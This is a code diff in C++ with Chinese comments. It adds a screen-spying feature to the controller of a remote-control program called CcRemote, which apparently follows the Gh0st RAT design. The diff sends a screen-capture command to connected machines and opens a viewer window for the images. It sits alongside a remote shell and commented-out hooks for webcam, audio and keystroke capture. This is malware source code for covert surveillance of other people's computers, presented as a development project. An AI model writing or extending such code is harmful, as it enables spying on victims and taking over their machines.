@@ -83,7 +83,8 @@ BEGIN_MESSAGE_MAP(CCcRemoteDlg, CDialogEx)
 	ON_MESSAGE(WM_ADDTOLIST,OnAddToList)
 	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
 	ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)
-
+	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
+	
 
 	//-------------系统-------------
 	ON_WM_SYSCOMMAND()
@@ -498,6 +499,8 @@ void CCcRemoteDlg::OnOnlineCmd()
 void CCcRemoteDlg::OnOnlineDesktop()
 {
 	// TODO: 在此添加命令处理程序代码
+	BYTE	bToken = COMMAND_SCREEN_SPY;  //向服务端发送COMMAND_SCREEN_SPY CKernelManager::OnReceive搜之
+	SendSelectCommand(&bToken, sizeof(BYTE));
 }
 
 
@@ -751,9 +754,9 @@ void CCcRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 		//case FILEMANAGER_DLG:
 		//	((CFileManagerDlg *)dlg)->OnReceiveComplete();
 		//	break;
-		//case SCREENSPY_DLG:
-		//	((CScreenSpyDlg *)dlg)->OnReceiveComplete();
-		//	break;
+		case SCREENSPY_DLG:
+			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
+			break;
 		//case WEBCAM_DLG:
 		//	((CWebCamDlg *)dlg)->OnReceiveComplete();
 		//	break;
@@ -765,7 +768,7 @@ void CCcRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 		//	break;
 		case SYSTEM_DLG:
 			((CSystemDlg *)dlg)->OnReceiveComplete();
-		break;
+			break;
 		case SHELL_DLG:
 			((CShellDlg *)dlg)->OnReceiveComplete();
 			break;
@@ -808,22 +811,22 @@ void CCcRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 	break;
 	/*case TOKEN_DRIVE_LIST: // 驱动器列表
 		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
-		g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
+		g_pCcRemoteDlg->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
 		break;
-	case TOKEN_BITMAPINFO: //
-		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
-		g_pConnectView->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
-		break;
+	
 	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
-		g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
+		g_pCcRemoteDlg->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
 		break;
 	case TOKEN_AUDIO_START: // 语音
-		g_pConnectView->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
+		g_pCcRemoteDlg->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
 		break;
 	case TOKEN_KEYBOARD_START:
-		g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
+		g_pCcRemoteDlg->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
 		break;*/
-
+	case TOKEN_BITMAPINFO: //
+		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
+		g_pCcRemoteDlg->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
+		break;
 	//进程遍历和窗口遍历公用的一个窗口类，在构造判断判断下类型来显示不同的数据
 	case TOKEN_WSLIST:
 	case TOKEN_PSLIST:
@@ -971,7 +974,7 @@ LRESULT CCcRemoteDlg::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
 	//这里定义远程终端的对话框，转到远程终端的CShellDlg类的定义  先查看对话框界面后转到OnInitDialog
 	CShellDlg	*dlg = new CShellDlg(this, m_iocpServer, pContext);
 
-	// 设置父窗口为卓面
+	// 设置父窗口为桌面
 	dlg->Create(IDD_SHELL, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 
@@ -993,5 +996,20 @@ LRESULT CCcRemoteDlg::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
 	pContext->m_Dialog[0] = SYSTEM_DLG;              //这个值用做服务端再次发送数据时的标识
 	pContext->m_Dialog[1] = (int)dlg;
 	//先看一下这个对话框的界面再看这个对话框类的构造函数
+	return 0;
+}
+
+//自定义消息 打开屏幕监控窗口
+LRESULT CCcRemoteDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
+{
+	ClientContext *pContext = (ClientContext *)lParam;
+
+	CScreenSpyDlg	*dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
+	// 设置父窗口为桌面
+	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
+	dlg->ShowWindow(SW_SHOW);
+
+	pContext->m_Dialog[0] = SCREENSPY_DLG;
+	pContext->m_Dialog[1] = (int)dlg;
 	return 0;
 }
